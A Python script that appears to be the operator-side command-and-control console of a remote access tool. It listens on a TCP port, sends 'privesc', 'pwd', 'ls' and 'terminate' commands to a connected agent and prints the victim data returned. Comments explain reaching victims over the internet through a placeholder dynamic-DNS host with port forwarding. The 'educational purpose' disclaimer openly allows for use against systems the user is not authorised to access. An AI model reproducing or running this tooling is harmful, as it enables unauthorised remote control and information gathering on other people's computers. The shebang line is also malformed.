#!/bin/sh/env python
import socket
import os
import sys

import colorama # pip install colorama
from colorama import Fore
colorama.init()

from banner import BANNER

CYAN  = Fore.CYAN
GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET

Command   = ["privesc", "pwd",
            "ls", "terminate",
            "exit"]
"""
 - Use this code (feel free for use) but if you use this code for compromise the illegal system (it's your risk)
 - This code for educational purpose/if you have any question send me a message to my github/youtube
 - Tested: (Windows 10 64-bit)/(Python: Version 3.12.4)
"""
class Agent():
    def __init__(self):
        self.localhost = ("127.0.0.1", 8080) # Try this code from localhost 'if works try with ddns'
        self.devilnets = ("dynamicdnsyourown.ddns.net", 8080) # Use Port Forward (YOUR OWN) -> (+) Dynamic DNS -> No-IP
        self.buffers   = ""
        self.banner    = (CYAN+BANNER+RESET)

    def server(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(self.localhost)
        s.listen(1)

        print(self.banner)

        conn, addr = s.accept()
        print(CYAN+f"[+] Listening On Server:[{self.localhost}]"+RESET) # for localhost -> {self.localhost}
        print(CYAN+f"[+] TCP Connected [{addr}]"+RESET)

        while True:
            execute = input(CYAN+f"code@anon_47$> {self.buffers}"+RESET)
            if Command[0] in execute:
                UserId = conn.send(b"privesc")
                print(GREEN+f"[+] Gather Information [SEND DATA:/{UserId}]"+RESET)
                RecvId = conn.recv(2048)
                print(GREEN+f"[+] Receive Information $USER:/{RecvId.decode()}"+RESET)
      
            if Command[1] in execute:
                PrintDir = conn.send(b"pwd")
                print(GREEN+f"[+] Print Working Directory [SEND DATA:/{PrintDir}]"+RESET)
                RecvDir = conn.recv(2048)
                print(GREEN+f"[+] Receive Information Dir:/{RecvDir.decode("utf-8")}"+RESET)
            
            if Command[2] in execute:
                ListItem = conn.send(b"ls")
                print(GREEN+f"[+] List of Item In Directory [SEND DATA:/{ListItem}]"+RESET)
                RecvList = conn.recv(2048)
                print(GREEN+f"[+] Receive Information Item:/{RecvList.decode("utf-8")}"+RESET)

            if Command[3] in execute:
                conn.send(b"terminate")
                print(RED+f"[-] SERVER: System Shutdown"+RESET)
                conn.close()
                sys.exit()
                    
            if Command[4] in execute:
                print(RED+f"[-] SYSTEM: Exiting console"+RESET)
                conn.close()
                sys.exit()

if __name__ == '__main__':
    AgentInit = Agent()
    AgentInit.server()